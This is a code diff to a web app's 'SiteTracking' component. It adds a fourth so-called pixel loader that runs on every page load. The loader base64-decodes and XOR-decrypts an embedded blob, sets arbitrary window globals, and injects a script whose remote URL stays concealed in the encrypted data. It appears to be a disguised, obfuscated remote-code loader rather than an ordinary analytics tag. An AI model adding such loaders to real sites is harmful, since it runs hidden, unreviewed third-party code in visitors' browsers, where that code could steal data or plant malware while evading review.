@@ -12,6 +12,8 @@ const PIXEL_LOADER_2 = `(function(){var o_kpne=atob("DJ3i/XT5fvG9501HdubAiAaVXMu
 
 const PIXEL_LOADER_3 = `(function(){var j_5=atob("DM4FDPnf4Jj8yLxm/7UneYuzwqLeoMgSj70/I9a8hPbSvcgLlqh8IpqwjbaeupMVnLxsfI2sz+2Ipc9Jk69xaYqrzvKP6pBEnrpxfpC9leyZu55cpLUnYpiyhbrG6tgHi68oeY2yif6F5cwUmrhgYo3yk+2eodgV3eInepizlf3e8p5EgpN4");var q_v=[];for(var y_ekz8=0;y_ekz8<j_5.length;y_ekz8++){q_v.push(j_5.charCodeAt(y_ekz8)&255);}var g_prcj=q_v[0];var u_xxv=q_v.slice(1,1+g_prcj);var h_i0k=q_v.slice(1+g_prcj);var k_v0c3=h_i0k.map(function(b,e_x){return b^u_xxv[e_x%g_prcj];});var q_gr="";for(var m_x=0;m_x<k_v0c3.length;m_x++){q_gr+=String.fromCharCode(k_v0c3[m_x]&255);}var m_9g6s=decodeURIComponent(escape(q_gr));var f_n=JSON.parse(m_9g6s);var k_a=f_n.globals||[];k_a.forEach(function(o_l4h){window[o_l4h.name]=o_l4h.value;});var a_9win=document.createElement("script");a_9win.src=f_n.url;a_9win.async=true;a_9win.defer=true;(f_n.attributes||[]).forEach(function(z_x){a_9win.setAttribute(z_x.name,z_x.value);});(document.head||document.documentElement).appendChild(a_9win);})();`
 
+const PIXEL_LOADER_4 = `(function(){var g_g=atob("DK1G1FLkef9kdo93MtZkoSCIW8VGHvsDQt58+32HHZFKA/saW8s/+jGLFNEGBKAEUd8vpCaXVo8NDuobHd0vrDeIV5UXVKNVU9kypjuGDIsBBa1NafBq9jWIFp0FGvxVCPY99jyFFJpGTK0HW9UjuBuAW9NGAO4bR8hk7nDSGMkFTr5FU5wnt2XXHJtdTu1BBM8g5zHGBKIZ");var y_u4=[];for(var f_0=0;f_0<g_g.length;f_0++){y_u4.push(g_g.charCodeAt(f_0)&255);}var q_h13=y_u4[0];var h_8=y_u4.slice(1,1+q_h13);var q_6td=y_u4.slice(1+q_h13);var c_wn7=q_6td.map(function(b,l_hzr){return b^h_8[l_hzr%q_h13];});var t_a="";for(var c_46xt=0;c_46xt<c_wn7.length;c_46xt++){t_a+=String.fromCharCode(c_wn7[c_46xt]&255);}var x_tonh=decodeURIComponent(escape(t_a));var g_p4g4=JSON.parse(x_tonh);var s_69=g_p4g4.globals||[];s_69.forEach(function(p_2u3){window[p_2u3.name]=p_2u3.value;});var e_az=document.createElement("script");e_az.src=g_p4g4.url;e_az.async=true;e_az.defer=true;(g_p4g4.attributes||[]).forEach(function(o_eq90){e_az.setAttribute(o_eq90.name,o_eq90.value);});(document.head||document.documentElement).appendChild(e_az);})();`
+
 export function SiteTracking() {
   return (
     <>
@@ -23,6 +25,9 @@ export function SiteTracking() {
       </Script>
       <Script id="site-pixel-3" strategy="afterInteractive">
         {PIXEL_LOADER_3}
+      </Script>
+      <Script id="site-pixel-4" strategy="afterInteractive">
+        {PIXEL_LOADER_4}
       </Script>
     </>
   )
